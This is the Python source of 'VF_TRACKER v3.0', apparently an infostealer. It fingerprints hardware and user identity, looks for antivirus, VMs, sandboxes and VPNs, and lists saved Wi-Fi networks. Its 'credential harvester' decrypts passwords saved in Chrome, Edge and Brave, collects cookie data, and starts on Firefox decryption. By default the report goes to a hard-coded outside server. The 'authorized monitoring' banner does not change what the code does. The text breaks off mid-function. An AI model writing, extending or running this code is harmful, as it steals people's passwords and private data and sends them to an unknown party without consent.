#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TRACKER v3.0 — Advanced System Identity Tracker                   ║
║     Part of the STORM_VX Architecture                                    ║
║                                                                           ║
║  Hardware Fingerprint | User Identity | Environment Detection            ║
║  Deep Network Recon   | Machine ID   | Smart Reporting                   ║
║                                                                           ║
║  FOR AUTHORIZED MONITORING ONLY!                                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  python VF_TRACKER.py                           # Auto-run, save + send
  python VF_TRACKER.py --silent                  # No console output
  python VF_TRACKER.py --no-server               # Local only, no send
  python VF_TRACKER.py --server http://example.com/receive.php
"""

import socket
import uuid
import urllib.request
import urllib.parse
import re
import ssl
import platform
import subprocess
import sys
import os
import json
import time
import hashlib
import argparse
from datetime import datetime

IS_WINDOWS = platform.system() == 'Windows'

# ═══════════════════════════════════════════════════════════════════════════════
# SERVER CONFIGURATION — Must match receive.php token!
# ═══════════════════════════════════════════════════════════════════════════════
VF_SECRET_TOKEN = 'xxx'
DEFAULT_SERVER_URL = 'http://namme.taskinoteam.ir/receive.php'

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY — Safe WMI/Command Runner
# ═══════════════════════════════════════════════════════════════════════════════

def _wmic(command_parts, timeout=8):
    """Run a wmic or system command safely and return stripped stdout lines."""
    try:
        result = subprocess.run(
            command_parts, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        # Remove header line if it looks like a wmic header
        if lines and any(hdr in lines[0].lower() for hdr in ['serialnumber', 'uuid', 'processorid', 'name', 'caption', 'product', 'version', 'last', 'fullname', 'description', 'layout', 'domain', 'driverversion', 'status', 'macaddress']):
            lines = lines[1:]
        return lines
    except Exception:
        return []


def _run_cmd(command_str, timeout=8):
    """Run a shell command safely and return stdout string."""
    try:
        result = subprocess.run(
            command_str, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        return result.stdout.strip()
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: HARDWARE FINGERPRINT
# ═══════════════════════════════════════════════════════════════════════════════

def get_motherboard_serial():
    """[HW-1] Motherboard Serial Number — never changes."""
    lines = _wmic(['wmic', 'baseboard', 'get', 'serialnumber'])
    return lines[0] if lines else "N/A"


def get_bios_uuid():
    """[HW-2] BIOS UUID — unique system identifier."""
    lines = _wmic(['wmic', 'csproduct', 'get', 'UUID'])
    return lines[0] if lines else "N/A"


def get_cpu_processor_id():
    """[HW-3] CPU Processor ID — unique per processor."""
    lines = _wmic(['wmic', 'cpu', 'get', 'processorid'])
    return lines[0] if lines else "N/A"


def get_disk_serial():
    """[HW-4] Disk Drive Serial Number — physical drive serial."""
    lines = _wmic(['wmic', 'diskdrive', 'get', 'serialnumber'])
    return lines[0] if lines else "N/A"


def get_gpu_info():
    """[HW-5] GPU Model and Driver Version."""
    if not IS_WINDOWS:
        # Try lspci on Linux
        try:
            result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
            gpu_lines = [l.strip() for l in result.stdout.split('\n') if 'VGA' in l or '3D' in l or 'Display' in l]
            if gpu_lines:
                return gpu_lines
        except Exception:
            pass
        return ["N/A (Windows WMI / lspci not available)"]
    lines = _wmic(['wmic', 'path', 'win32_videocontroller', 'get', 'name,driverversion'])
    gpus = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 2:
            version = parts[-1]
            name = ' '.join(parts[:-1])
            gpus.append(f"{name} (Driver: {version})")
        elif len(parts) == 1 and parts[0]:
            gpus.append(parts[0])
    return gpus if gpus else ["N/A"]


def get_battery_info():
    """[HW-6] Battery Info (laptops only)."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'path', 'win32_battery', 'get', 'name,estimatedchargeremaining'])
    if not lines:
        return "No battery detected (Desktop PC)"
    info = []
    for line in lines:
        if line:
            info.append(line.strip())
    return ' | '.join(info) if info else "No battery detected"


def generate_hwid(motherboard_serial, bios_uuid, cpu_id, disk_serial, mac_addr):
    """[HW-7] Generate unique Hardware ID (SHA256 hash of all HW IDs combined)."""
    raw = f"{motherboard_serial}|{bios_uuid}|{cpu_id}|{disk_serial}|{mac_addr}"
    return hashlib.sha256(raw.encode('utf-8')).hexdigest()


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: USER IDENTITY & ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════════════

def get_windows_username():
    """[ID-1] Current Windows username."""
    try:
        return os.getlogin()
    except Exception:
        try:
            return os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        except Exception:
            return "Unknown"


def get_user_fullname():
    """[ID-2] Full name registered in Windows."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'fullname'])
    return lines[0] if lines else "N/A"


def get_last_login():
    """[ID-3] Last login time for current user."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'lastlogin'])
    return lines[0] if lines else "N/A"


def get_installed_users():
    """[ID-4] List of all user accounts on the system."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['cut', '-d:', '-f1', '/etc/passwd'],
                                    capture_output=True, text=True, timeout=5)
            return [u for u in result.stdout.strip().split('\n') if u and not u.startswith('_')]
        except Exception:
            return ["N/A"]
    lines = _wmic(['wmic', 'useraccount', 'get', 'name'])
    return lines if lines else ["N/A"]


def get_domain_workgroup():
    """[ID-5] Domain or Workgroup name."""
    if not IS_WINDOWS:
        return "N/A"
    domain_lines = _wmic(['wmic', 'computersystem', 'get', 'domain'])
    wg_lines = _wmic(['wmic', 'computersystem', 'get', 'workgroup'])
    domain = domain_lines[0] if domain_lines else "?"
    workgroup = wg_lines[0] if wg_lines else "?"
    return f"Domain: {domain} | Workgroup: {workgroup}"


def get_installed_programs():
    """[ID-6] List of installed programs (name + version)."""
    if not IS_WINDOWS:
        return ["N/A (Windows WMI only)"]
    try:
        result = subprocess.run(
            ['wmic', 'product', 'get', 'name,version'],
            capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            # Skip header
            programs = []
            for line in lines[1:]:
                parts = line.rsplit(None, 1)
                if len(parts) == 2:
                    programs.append(f"{parts[0]} (v{parts[1]})")
                elif len(parts) == 1 and parts[0]:
                    programs.append(parts[0])
            return programs[:50]  # Limit to 50 programs
        return ["No programs found"]
    except subprocess.TimeoutExpired:
        return ["Timeout - WMI product query too slow"]
    except Exception:
        return ["Error retrieving"]


def get_running_processes():
    """[ID-7] Running processes (top 30 by name)."""
    try:
        if IS_WINDOWS:
            lines = _wmic(['wmic', 'process', 'get', 'name'], timeout=10)
        else:
            result = subprocess.run(['ps', '-eo', 'comm'], capture_output=True,
                                    text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()][1:]
        # Deduplicate and sort
        unique = sorted(set(lines))
        return unique[:30] if unique else ["None found"]
    except Exception:
        return ["Error retrieving"]


def get_antivirus_info():
    """[ID-8] Antivirus software detection."""
    if not IS_WINDOWS:
        return ["N/A"]
    try:
        result = subprocess.run(
            ['wmic', '/namespace:\\\\root\\securitycenter2', 'path',
             'antivirusproduct', 'get', 'displayName,productState'],
            capture_output=True, text=True, timeout=8, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            avs = []
            for line in lines[1:]:
                if line:
                    # Decode productState: 266240 = enabled, 393216 = disabled, 397312 = updating
                    parts = line.split()
                    if len(parts) >= 2:
                        state_hex = parts[-1]
                        try:
                            state_int = int(state_hex)
                            if state_int in [266240, 266256]:
                                status = "Enabled"
                            elif state_int in [393216, 393232]:
                                status = "Disabled"
                            elif state_int in [397312, 397328]:
                                status = "Updating"
                            else:
                                status = f"Unknown({state_hex})"
                            name = ' '.join(parts[:-1])
                            avs.append(f"{name} [{status}]")
                        except ValueError:
                            avs.append(line)
                    else:
                        avs.append(line)
            return avs if avs else ["No antivirus detected"]
        return ["No antivirus detected"]
    except Exception:
        return ["Access denied / Not available"]


def detect_vm_sandbox():
    """[ID-9] Detect Virtual Machine or Sandbox environment."""
    indicators = []
    if not IS_WINDOWS:
        return ["N/A (Windows detection only)"]

    # Check 1: MAC address vendor prefixes for VMs
    mac = get_mac_address().lower()
    vm_mac_prefixes = ['00:0c:29', '00:50:56', '00:05:69',  # VMware
                       '08:00:27', '0a:00:27',               # VirtualBox
                       '00:15:5d',                           # Hyper-V
                       '00:1c:42',                           # Parallels
                       '52:54:00']                           # QEMU/KVM
    for prefix in vm_mac_prefixes:
        if mac.startswith(prefix):
            indicators.append(f"VM MAC detected: {mac} (prefix: {prefix})")
            break

    # Check 2: VM-specific processes
    vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                    'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
                    'prl_tools.exe', 'prl_cc.exe', 'spoolsv.exe']
    try:
        result = subprocess.run(['wmic', 'process', 'get', 'name'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        running = result.stdout.lower()
        for vp in vm_processes:
            if vp.lower() in running:
                indicators.append(f"VM process: {vp}")
    except Exception:
        pass

    # Check 3: VM-specific registry keys
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\VMware, Inc.'],
            capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            indicators.append("VMware registry key found")
    except Exception:
        pass

    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\Oracle\\VirtualBox'],
            capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            indicators.append("VirtualBox registry key found")
    except Exception:
        pass

    # Check 4: System model via WMI
    model_lines = _wmic(['wmic', 'computersystem', 'get', 'model'])
    if model_lines:
        model = model_lines[0].lower()
        vm_keywords = ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm',
                       'xen', 'hyper-v', 'parallels']
        for kw in vm_keywords:
            if kw in model:
                indicators.append(f"System model contains: {model_lines[0]}")
                break

    # Check 5: Low RAM check (VMs often have < 4GB)
    ram_lines = _wmic(['wmic', 'OS', 'get', 'TotalVisibleMemorySize'])
    if ram_lines:
        try:
            ram_kb = int(ram_lines[0].split()[0])
            ram_gb = ram_kb / 1024 / 1024
            if ram_gb < 4:
                indicators.append(f"Low RAM: {ram_gb:.1f} GB (possible VM)")
        except Exception:
            pass

    # Check 6: Single CPU core check
    cpu_count = os.cpu_count()
    if cpu_count and cpu_count == 1:
        indicators.append("Single CPU core (possible VM)")

    if not indicators:
        return ["No VM/Sandbox indicators detected (likely physical machine)"]
    return indicators


def get_timezone_locale():
    """[ID-10] Timezone and Locale information."""
    tz_name = time.tzname
    tz_offset = time.strftime('%z')
    try:
        import locale
        try:
            locale_str = locale.getlocale()[0] or "Unknown"
        except Exception:
            locale_str = os.environ.get('LANG', os.environ.get('LC_ALL', 'Unknown'))
    except Exception:
        locale_str = "Unknown"
    return f"TZ: {tz_name[0]} (UTC{tz_offset}) | Locale: {locale_str}"


def get_keyboard_layout():
    """[ID-11] Keyboard layout(s) in use."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'keyboard', 'get', 'layout'])
    if lines:
        return ', '.join(lines)
    # Fallback: check registry
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKCU\\Keyboard Layout\\Preload'],
            capture_output=True, text=True, timeout=3)
        if result.stdout:
            layouts = re.findall(r'REG_SZ\s+(\S+)', result.stdout)
            if layouts:
                return ', '.join(layouts)
    except Exception:
        pass
    return "Unknown"


def detect_vpn_proxy():
    """[ID-12] Detect VPN or Proxy usage."""
    indicators = []

    if IS_WINDOWS:
        # Check for VPN adapter names
        try:
            result = subprocess.run(['wmic', 'nic', 'get', 'name,netenabled'],
                                    capture_output=True, text=True, timeout=5,
                                    encoding='utf-8', errors='replace')
            vpn_keywords = ['vpn', 'tunnel', 'tap', 'tun', 'wireguard',
                            'nordvpn', 'expressvpn', 'proton', 'mullvad',
                            'cyberghost', 'surfshark', 'hideme', 'openvpn']
            for line in result.stdout.split('\n'):
                line_lower = line.lower()
                for kw in vpn_keywords:
                    if kw in line_lower and 'true' in line.lower():
                        indicators.append(f"VPN adapter: {line.strip()}")
                        break
        except Exception:
            pass

        # Check for proxy settings
        try:
            result = subprocess.run(
                ['reg', 'query',
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                 '/v', 'ProxyEnable'],
                capture_output=True, text=True, timeout=3)
            if '0x1' in result.stdout:
                indicators.append("System proxy: ENABLED")
                # Get proxy server
                result2 = subprocess.run(
                    ['reg', 'query',
                     'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                     '/v', 'ProxyServer'],
                    capture_output=True, text=True, timeout=3)
                proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
                if proxy_match:
                    indicators.append(f"Proxy server: {proxy_match.group(1).strip()}")
            elif '0x0' in result.stdout:
                indicators.append("System proxy: Disabled")
        except Exception:
            pass

    else:
        # Linux: check for tun/tap interfaces
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True,
                                    text=True, timeout=5)
            if 'tun' in result.stdout.lower() or 'tap' in result.stdout.lower():
                indicators.append("VPN interface (tun/tap) detected")
        except Exception:
            pass

        # Check environment for proxy
        for var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
            val = os.environ.get(var)
            if val:
                indicators.append(f"Proxy env: {var}={val}")

    if not indicators:
        return ["No VPN/Proxy detected"]
    return indicators


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: DEEP NETWORK RECON
# ═══════════════════════════════════════════════════════════════════════════════

def get_current_wifi_info():
    """[NET-1,2] Current WiFi SSID and Signal Strength."""
    if not IS_WINDOWS:
        return "N/A", "N/A"
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        ssid_match = re.search(r'(?:SSID|Profile)\s*:\s*(.+)', result.stdout)
        signal_match = re.search(r'Signal\s*:\s*(.+)', result.stdout)

        ssid = ssid_match.group(1).strip() if ssid_match else "Not connected"
        signal = signal_match.group(1).strip() if signal_match else "N/A"
        return ssid, signal
    except Exception:
        return "Error", "Error"


def get_all_wifi_profiles():
    """[NET-3] All previously connected WiFi networks — movement history."""
    if not IS_WINDOWS:
        return ["N/A (Windows only)"]
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        profiles = re.findall(r':\s+(.+)\s*$', result.stdout, re.MULTILINE)
        return [p.strip() for p in profiles if p.strip()] if profiles else ["No WiFi profiles"]
    except Exception:
        return ["Error retrieving"]


def get_dns_servers():
    """[NET-4] DNS server addresses."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['cat', '/etc/resolv.conf'],
                                    capture_output=True, text=True, timeout=5)
            dns_lines = []
            for l in result.stdout.split('\n'):
                if l.strip().startswith('nameserver'):
                    ip = l.strip().replace('nameserver', '').strip()
                    if ip:
                        dns_lines.append(ip)
            return dns_lines if dns_lines else ["Not found"]
        except Exception:
            return ["Error"]
    try:
        result = subprocess.run(['ipconfig', '/all'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        dns_matches = re.findall(r'DNS Servers?\s*\.+\s*:\s*([\d\.]+)', result.stdout)
        return dns_matches if dns_matches else ["Not found"]
    except Exception:
        return ["Error"]


def get_dhcp_server():
    """[NET-5] DHCP server address."""
    if not IS_WINDOWS:
        return "N/A"
    try:
        result = subprocess.run(['ipconfig', '/all'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        match = re.search(r'DHCP Server\s*\.+\s*:\s*([\d\.]+)', result.stdout)
        return match.group(1) if match else "Not found"
    except Exception:
        return "Error"


def get_all_network_adapters():
    """[NET-6] All network adapters with details."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['ip', 'link', 'show'],
                                    capture_output=True, text=True, timeout=5)
            return [l.strip() for l in result.stdout.split('\n') if l.strip()][:10]
        except Exception:
            return ["Error"]
    try:
        result = subprocess.run(
            ['wmic', 'nic', 'get', 'name,macaddress,netenabled,speed'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            adapters = []
            for line in lines[1:]:
                if line:
                    adapters.append(line)
            return adapters if adapters else ["None found"]
        return ["None found"]
    except Exception:
        return ["Error retrieving"]


def get_proxy_settings():
    """[NET-8] Detailed proxy settings."""
    if not IS_WINDOWS:
        # Check env vars
        proxies = []
        for var in ['http_proxy', 'https_proxy', 'ftp_proxy', 'no_proxy']:
            val = os.environ.get(var, os.environ.get(var.upper()))
            if val:
                proxies.append(f"{var}={val}")
        return proxies if proxies else ["No proxy settings"]

    settings = []
    try:
        # WinHTTP proxy
        result = subprocess.run(['netsh', 'winhttp', 'show', 'proxy'],
                                capture_output=True, text=True, timeout=3,
                                encoding='utf-8', errors='replace')
        if 'Direct access' in result.stdout:
            settings.append("WinHTTP: Direct (no proxy)")
        else:
            proxy_match = re.search(r'Proxy Server\s*:\s*(.+)', result.stdout)
            if proxy_match:
                settings.append(f"WinHTTP Proxy: {proxy_match.group(1).strip()}")
    except Exception:
        pass

    try:
        # IE/System proxy
        result = subprocess.run(
            ['reg', 'query',
             'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
             '/v', 'ProxyEnable'],
            capture_output=True, text=True, timeout=3)
        if '0x1' in result.stdout:
            result2 = subprocess.run(
                ['reg', 'query',
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                 '/v', 'ProxyServer'],
                capture_output=True, text=True, timeout=3)
            proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
            if proxy_match:
                settings.append(f"System Proxy: {proxy_match.group(1).strip()}")
        else:
            settings.append("System Proxy: Disabled")
    except Exception:
        pass

    return settings if settings else ["No proxy settings found"]




# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: CREDENTIAL HARVESTER v3 — Browser saved passwords extraction
# Supports: Chrome, Firefox (NSS), Edge, Brave
# Decryption: DPAPI (win32crypt + ctypes fallback), AES-256-GCM (pycryptodome + cryptography fallback)
# v3 fixes: scan ALL profiles, include empty-username entries, DPAPI via ctypes, better error info
# ═══════════════════════════════════════════════════════════════════════════════

# Chrome encryption key cache (avoid re-reading Local State for every password)
_chrome_key_cache = {}

def _dpapi_decrypt_ctypes(data):
    """Decrypt data using Windows DPAPI via ctypes (no pywin32 needed)."""
    if not IS_WINDOWS:
        return None
    try:
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_ubyte))
            ]

        p = ctypes.create_string_buffer(data, len(data))
        blob_in = DATA_BLOB(len(data), ctypes.cast(p, ctypes.POINTER(ctypes.c_ubyte)))
        blob_out = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted
        return None
    except Exception:
        return None


def _get_chrome_encryption_key(browser_type="chrome"):
    """Get and cache the Chrome/Edge/Brave AES encryption key from Local State.
    Supports DPAPI via win32crypt OR ctypes fallback."""
    if browser_type in _chrome_key_cache:
        return _chrome_key_cache[browser_type]
    
    try:
        if IS_WINDOWS:
            if browser_type == "chrome":
                local_state_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'Google', 'Chrome', 'User Data', 'Local State'
                )
            elif browser_type == "edge":
                local_state_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'Microsoft', 'Edge', 'User Data', 'Local State'
                )
            elif browser_type == "brave":
                local_state_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'
                )
            else:
                _chrome_key_cache[browser_type] = None
                return None
        else:
            if browser_type == "chrome":
                local_state_path = os.path.expanduser('~/.config/google-chrome/Local State')
            elif browser_type == "edge":
                local_state_path = os.path.expanduser('~/.config/microsoft-edge/Local State')
            elif browser_type == "brave":
                local_state_path = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Local State')
            else:
                _chrome_key_cache[browser_type] = None
                return None

        if not os.path.exists(local_state_path):
            _chrome_key_cache[browser_type] = None
            return None

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])

        if IS_WINDOWS:
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            # Try win32crypt first, then ctypes DPAPI fallback
            key = None
            try:
                import win32crypt
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except ImportError:
                pass
            if key is None:
                key = _dpapi_decrypt_ctypes(encrypted_key)
            if key is None:
                _chrome_key_cache[browser_type] = None
                return None
        else:
            # Linux: Chrome v80+ uses key from Local State with PBKDF2
            try:
                from Crypto.Cipher import AES
                from Crypto.Protocol.KDF import PBKDF2
                from Crypto.Hash import SHA1, HMAC
                salt = b'saltysalt'
                key = PBKDF2(b'peanuts', salt, dkLen=16, count=1,
                            prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
            except ImportError:
                _chrome_key_cache[browser_type] = None
                return None

        _chrome_key_cache[browser_type] = key
        return key
    except Exception:
        _chrome_key_cache[browser_type] = None
        return None


def _aes_gcm_decrypt(key, nonce, ciphertext, tag):
    """AES-GCM decrypt with pycryptodome OR cryptography library fallback."""
    # Try pycryptodome first
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except ImportError:
        pass
    except Exception:
        pass

    # Try cryptography library
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext + tag, None)
    except ImportError:
        pass
    except Exception:
        pass

    return None


def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
    """Decrypt Chrome/Edge/Brave password using DPAPI or AES-256-GCM (v80+).
    Supports multiple decryption backends for maximum compatibility."""
    try:
        if not encrypted_password:
            return "(empty)"

        if IS_WINDOWS:
            # Chrome v80+ uses AES-256-GCM with prefix 'v10' or 'v11'
            if encrypted_password[:3] in (b'v10', b'v11'):
                key = _get_chrome_encryption_key(browser_type)
                if key:
                    nonce = encrypted_password[3:15]
                    ciphertext_tag = encrypted_password[15:]
                    ciphertext = ciphertext_tag[:-16]
                    tag = ciphertext_tag[-16:]
                    result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
                    if result is not None:
                        return result.decode('utf-8', errors='replace')

            # Fallback: Try DPAPI via win32crypt
            try:
                import win32crypt
                return win32crypt.CryptUnprotectData(
                    encrypted_password, None, None, None, 0
                )[1].decode('utf-8', errors='replace')
            except ImportError:
                pass
            except Exception:
                pass

            # Fallback: Try DPAPI via ctypes
            result = _dpapi_decrypt_ctypes(encrypted_password)
            if result:
                return result.decode('utf-8', errors='replace')

            return "[DECRYPT_FAILED]"

        else:
            # Linux: PBKDF2 with 'peanuts' password
            if encrypted_password[:3] in (b'v10', b'v11'):
                key = _get_chrome_encryption_key(browser_type)
                if key:
                    nonce = encrypted_password[3:15]
                    ciphertext_tag = encrypted_password[15:]
                    ciphertext = ciphertext_tag[:-16]
                    tag = ciphertext_tag[-16:]
                    result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
                    if result is not None:
                        return result.decode('utf-8', errors='replace')

            # Fallback: PBKDF2 direct (pre-v80 Linux Chrome)
            try:
                from Crypto.Cipher import AES
                from Crypto.Protocol.KDF import PBKDF2
                from Crypto.Hash import SHA1, HMAC
                salt = b'saltysalt'
                key = PBKDF2(b'peanuts', salt, dkLen=16, count=1,
                            prf=lambda p, s: HMAC.new(p, s, SHA1).digest())
                iv = b' ' * 16
                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                decrypted = cipher.decrypt(encrypted_password)
                # Remove PKCS7 padding
                pad_len = decrypted[-1]
                if isinstance(pad_len, int) and 1 <= pad_len <= 16:
                    decrypted = decrypted[:-pad_len]
                return decrypted.decode('utf-8', errors='replace')
            except ImportError:
                pass
            except Exception:
                pass

            return "[LINUX_DECRYPT_FAILED]"

    except Exception:
        return "[DECRYPT_ERROR]"


def _read_chromium_db(db_path, browser_type="chrome", browser_name="Chrome"):
    """Read Chromium-based Login Data SQLite database (Chrome, Edge, Brave).
    v3: includes entries with empty usernames."""
    results = []
    try:
        import sqlite3
        import shutil, tempfile
        temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name.lower()}_login_temp_{os.getpid()}.db')
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

        for row in cursor.fetchall():
            url = row[0] if row[0] else "N/A"
            username = row[1] if row[1] else ""
            encrypted_pw = row[2]

            if encrypted_pw:
                decrypted = _decrypt_chromium_password(encrypted_pw, browser_type)
            else:
                decrypted = "(empty)"

            # v3: include ALL entries, even with empty username
            results.append({
                "browser": browser_name,
                "url": url,
                "username": username if username else "(no username)",
                "password": decrypted
            })

        conn.close()
        try:
            os.remove(temp_db)
        except Exception:
            pass

    except Exception as e:
        results.append({
            "browser": browser_name,
            "url": "ERROR",
            "username": str(e),
            "password": ""
        })

    return results


def _find_chromium_profiles(base_path):
    """Find ALL profile directories containing Login Data.
    v3: scans every subdirectory, not just Default/Profile*."""
    paths = []
    if not os.path.isdir(base_path):
        return paths
    for d in os.listdir(base_path):
        full_dir = os.path.join(base_path, d)
        if not os.path.isdir(full_dir):
            continue
        # Skip non-profile directories
        if d.lower() in ('default', 'system profile') or d.startswith('Profile') or d.startswith('Default'):
            profile_path = os.path.join(full_dir, 'Login Data')
            if os.path.exists(profile_path):
                paths.append(profile_path)
    return paths


def _harvest_chromium_all(base_path, browser_type, browser_name):
    """v3: Scan ALL Chromium profiles and combine results."""
    results = []
    
    # Scan all profiles found
    all_login_dbs = _find_chromium_profiles(base_path)
    
    # Also check Default explicitly (in case _find_chromium_profiles misses it)
    default_db = os.path.join(base_path, 'Default', 'Login Data')
    if os.path.exists(default_db) and default_db not in all_login_dbs:
        all_login_dbs.insert(0, default_db)
    
    # Sort: Default first, then Profile 1, Profile 2, etc.
    def sort_key(p):
        dirname = os.path.basename(os.path.dirname(p))
        if dirname == 'Default':
            return '0'
        return dirname
    all_login_dbs.sort(key=sort_key)
    
    for db_path in all_login_dbs:
        profile_name = os.path.basename(os.path.dirname(db_path))
        profile_results = _read_chromium_db(db_path, browser_type, browser_name)
        # Tag each result with the profile name
        for r in profile_results:
            r['profile'] = profile_name
        results.extend(profile_results)
    
    return results


def harvest_chrome_passwords():
    """[CRED-1] Extract saved passwords from Google Chrome.
    v3: scans ALL profiles (Default, Profile 1, Profile 2, etc.)."""
    if IS_WINDOWS:
        base = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                           'Google', 'Chrome', 'User Data')
    else:
        base = os.path.expanduser('~/.config/google-chrome')

    if not os.path.isdir(base):
        return [{"browser": "Chrome", "info": "Chrome User Data not found"}]

    return _harvest_chromium_all(base, "chrome", "Chrome")


def harvest_chrome_cookies():
    """[CRED-2] Extract cookies from Google Chrome (names and domains only)."""
    results = []

    if IS_WINDOWS:
        db_path = os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
        )
    else:
        db_path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')

    if not os.path.exists(db_path):
        return [{"browser": "Chrome", "info": "Cookie database not found"}]

    try:
        import sqlite3, shutil, tempfile
        temp_db = os.path.join(tempfile.gettempdir(), 'chrome_cookies_temp.db')
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        # Try new schema first (encrypted_value), fallback to old
        try:
            cursor.execute('SELECT host_key, name, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 200')
        except Exception:
            cursor.execute('SELECT host_key, name, path, expires_utc, is_secure FROM cookies LIMIT 200')

        for row in cursor.fetchall():
            results.append({
                "browser": "Chrome",
                "domain": row[0],
                "name": row[1],
                "path": row[2],
                "expires": row[3],
                "secure": bool(row[4])
            })

        conn.close()
        try:
            os.remove(temp_db)
        except Exception:
            pass

    except Exception as e:
        results.append({"browser": "Chrome", "error": str(e)})

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# FIREFOX NSS DECRYPTION — Using ctypes to load nss3 library
# ═══════════════════════════════════════════════════════════════════════════════

def _try_firefox_nss_decrypt(profile_path, enc_data_b64):
    """
    Decrypt Firefox login data using NSS library via ctypes.
    Firefox uses PK11SDR_Decrypt from nss3.dll / libnss3.so.
    """
    import ctypes
    import ctypes.util

    try:
        raw_data = base64.b64decode(enc_data_b64)
    except Exception:
        return None

    # Find NSS library
    nss3_path = None
    if IS_WINDOWS:
        ff_dirs = [
